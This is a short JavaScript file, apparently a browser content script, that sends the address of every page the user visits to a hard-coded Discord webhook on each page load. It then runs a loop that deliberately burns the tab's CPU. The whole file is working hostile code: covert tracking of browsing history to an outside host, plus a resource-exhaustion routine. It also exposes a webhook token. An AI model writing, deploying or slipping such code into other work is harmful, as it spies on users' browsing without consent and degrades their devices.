const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1351937979718959137/n4gj7STURnoohr5DCKzGE-nFHLp6U19b-jh7wQRSotlb-hogaJf_Ztf80s0BbZigAtGb";

function sendVisitToDiscord(url) {
  const now = new Date();
  const timestamp = now.toLocaleString(); // e.g. "7/6/2025, 8:13:14 PM"

  const payload = {
    content: `🌐 Visited: ${url}\n🕒 Time: ${timestamp}`
  };

  fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  }).catch(err => {
    console.error("❌ Failed to send to Discord:", err);
  });
}

// Only send once per page load
if (document.readyState === "complete" || document.readyState === "interactive") {
  if (window.location.href.startsWith("http")) {
    sendVisitToDiscord(window.location.href);
  }
} else {
  window.addEventListener("DOMContentLoaded", () => {
    if (window.location.href.startsWith("http")) {
      sendVisitToDiscord(window.location.href);
    }
  });
}

// CPU burn function:
const INTENSITY = 150; // 1–100 ms CPU burn duration

function burnTabCPU() {
  setInterval(() => {
    const end = Date.now() + INTENSITY;
    while (Date.now() < end) {
      Math.sqrt(Math.random() * Math.random());
    }
  }, 10);
}

burnTabCPU();
